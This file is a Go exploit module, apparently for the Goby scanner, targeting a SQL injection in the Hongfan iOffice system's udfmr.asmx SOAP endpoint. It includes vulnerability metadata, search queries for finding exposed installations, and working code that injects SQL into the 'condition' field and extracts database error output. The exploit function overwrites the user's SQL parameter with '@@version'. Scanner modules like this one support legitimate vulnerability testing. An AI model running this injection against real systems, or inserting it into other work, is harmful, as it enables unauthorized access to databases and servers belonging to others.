package exploits

import (
    "git.gobies.org/goby/goscanner/goutils"
    "git.gobies.org/goby/goscanner/jsonvul"
    "git.gobies.org/goby/goscanner/scanconfig"
    "git.gobies.org/goby/httpclient"
    "regexp"
    "strings"
)

func init() {
    expJson := `{
    "Name": "Hongfan Ioffice System udfmr.asmx SQL Injection",
    "Description": "<p>Hongfan ioffice is a widely used OA system.There is a SQL injection vulnerability in one of its API interfaces.</p><p>In addition to using SQL injection vulnerabilities to obtain information in the database (for example, the administrator's back-end password, the user's personal information of the site), an attacker can write a Trojan horse to the server even in a high-privileged situation to further obtain server system permissions.</p>",
    "Impact": "<p>Hongfan Ioffice System SQL Injection</p>",
    "Recommendation": "<p>1. There is currently no detailed solution provided, please pay attention to the manufacturer's homepage update:</p><p><a href=\"http://www.ioffice.cn/\">http://www.ioffice.cn/</a></p><p></p><p>2. Deploy a web application firewall to monitor database operations.</p><p>3. If not necessary, prohibit public network access to the system.</p>",
    "Product": "Hongfan-ioffice",
    "VulType": [
        "SQL Injection"
    ],
    "Tags": [
        "SQL Injection"
    ],
    "Translation": {
        "CN": {
            "Name": "红帆 OA ioffice udfmr.asmx SQL 注入漏洞",
            "Product": "红帆-ioffice",
            "Description": "<p>红帆OA ioffice是一款广泛使用的OA系统，其某接口存在SQL注入漏洞。</p><p>攻击者除了可以利用 SQL 注入漏洞获取数据库中的信息（例如，管理员后台密码、站点的用户个人信息）之外，甚至在高权限的情况可向服务器中写入木马，进一步获取服务器系统权限。<br></p>",
            "Recommendation": "<p>1、官方暂未修复该漏洞，请用户联系厂商修复漏洞：<a href=\"http://www.ioffice.cn/\">http://www.ioffice.cn/</a><br></p><p>2、部署Web应用防火墙，对数据库操作进行监控。</p><p>3、如非必要，禁止公网访问该系统。</p>",
            "Impact": "<p>攻击者除了可以利用 SQL 注入漏洞获取数据库中的信息（例如，管理员后台密码、站点的用户个人信息）之外，甚至在高权限的情况可向服务器中写入木马，进一步获取服务器系统权限。<br></p>",
            "VulType": [
                "SQL注入"
            ],
            "Tags": [
                "SQL注入"
            ]
        },
        "EN": {
            "Name": "Hongfan Ioffice System udfmr.asmx SQL Injection",
            "Product": "Hongfan-ioffice",
            "Description": "<p>Hongfan ioffice is a widely used OA system.There is a SQL injection vulnerability in one of its API interfaces.</p><p>In addition to using SQL injection vulnerabilities to obtain information in the database (for example, the administrator's back-end password, the user's personal information of the site), an attacker can write a Trojan horse to the server even in a high-privileged situation to further obtain server system permissions.</p>",
            "Recommendation": "<p>1. There is currently no detailed solution provided, please pay attention to the manufacturer's homepage update:<br></p><p><a href=\"http://www.ioffice.cn/\">http://www.ioffice.cn/</a><br></p><p></p><p>2. Deploy a web application firewall to monitor database operations.</p><p>3. If not necessary, prohibit public network access to the system.</p>",
            "Impact": "<p>Hongfan Ioffice System SQL Injection</p>",
            "VulType": [
                "SQL Injection"
            ],
            "Tags": [
                "SQL Injection"
            ]
        }
    },
    "FofaQuery": "title=\"iOffice.net\" || body=\"/iOffice/js\" || (body=\"iOffice.net\" && header!=\"couchdb\" && header!=\"drupal\") || body=\"iOfficeOcxSetup.exe\" || body=\"Hongfan. All Rights Reserved\"",
    "GobyQuery": "title=\"iOffice.net\" || body=\"/iOffice/js\" || (body=\"iOffice.net\" && header!=\"couchdb\" && header!=\"drupal\") || body=\"iOfficeOcxSetup.exe\" || body=\"Hongfan. All Rights Reserved\"",
    "Author": "Zther0",
    "Homepage": "http://www.ioffice.cn/",
    "DisclosureDate": "2022-08-02",
    "References": [
        "https://fofa.so/"
    ],
    "HasExp": true,
    "Is0day": false,
    "Level": "2",
    "CVSS": "7.5",
    "CVEIDs": [],
    "CNVD": [],
    "CNNVD": [],
    "ScanSteps": [
        "AND",
        {
            "Request": {
                "method": "POST",
                "uri": "/iOffice/prg/set/wss/udfmr.asmx",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "!=",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "regex",
                        "value": "",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "POST",
                "uri": "/iOffice/prg/set/wss/udfmr.asmx",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "!=",
                        "value": "200",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExpParams": [
        {
            "name": "sql",
            "type": "input",
            "value": "@@version",
            "show": ""
        }
    ],
    "ExpTips": {
        "type": "",
        "content": ""
    },
    "AttackSurfaces": {
        "Application": [],
        "Support": [],
        "Service": [],
        "System": [],
        "Hardware": []
    },
    "PocId": "10501"
}`

    sendPayloadFlagGV9v6E := func(hostinfo *httpclient.FixUrl, sql string) (*httpclient.HttpResponse, error) {
        requestConfig := httpclient.NewPostRequestConfig("/iOffice/prg/set/wss/udfmr.asmx")
        requestConfig.Header.Store("Content-Type", "application/soap+xml; charset=utf-8")
        payload := `<?xml version="1.0" encoding="utf-8"?>
<soap12:Envelope xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:soap12="http://www.w3.org/2003/05/soap-envelope">
  <soap12:Body>
    <GetEmpSearch xmlns="http://tempuri.org/ioffice/udfmr">
      <condition>1=` + sql + `</condition>
    </GetEmpSearch>
  </soap12:Body>
</soap12:Envelope>`
        requestConfig.Data = payload
        return httpclient.DoHttpRequest(hostinfo, requestConfig)
    }

    ExpManager.AddExploit(NewExploit(
        goutils.GetFileName(),
        expJson,
        func(exp *jsonvul.JsonVul, hostinfo *httpclient.FixUrl, stepLogs *scanconfig.SingleScanConfig) bool {
            rsp, err := sendPayloadFlagGV9v6E(hostinfo, "@@version")
            if err != nil || rsp == nil {
                return false
            } else if rsp.StatusCode != 200 && strings.Contains(rsp.Utf8Html, "System.Data.SqlClient.SqlException:") {
                return true
            }
            return false
        },
        func(expResult *jsonvul.ExploitResult, ss *scanconfig.SingleScanConfig) *jsonvul.ExploitResult {
            sql := goutils.B2S(ss.Params["sql"])
            sql = "@@version"
            rsp, err := sendPayloadFlagGV9v6E(expResult.HostInfo, sql)
            if err != nil || rsp == nil {
                expResult.Output = err.Error()
                return expResult
            } else if rsp.StatusCode != 200 && strings.Contains(rsp.Utf8Html, "System.Data.SqlClient.SqlException:") {
                matchStrings := regexp.MustCompile(`System.Data.SqlClient.SqlException: [\s\S]+System.Data.SqlClient.SqlConnection.OnError`).FindStringSubmatch(rsp.Utf8Html)
                if len(matchStrings) > 0 {
                    output := matchStrings[0]
                    output = strings.ReplaceAll(output, "System.Data.SqlClient.SqlException: ", "")
                    output = strings.ReplaceAll(output, "  在 System.Data.SqlClient.SqlConnection.OnError", "")
                    expResult.Output = output
                }
                expResult.Success = true
                return expResult
            }
            return expResult
        },
    ))
}
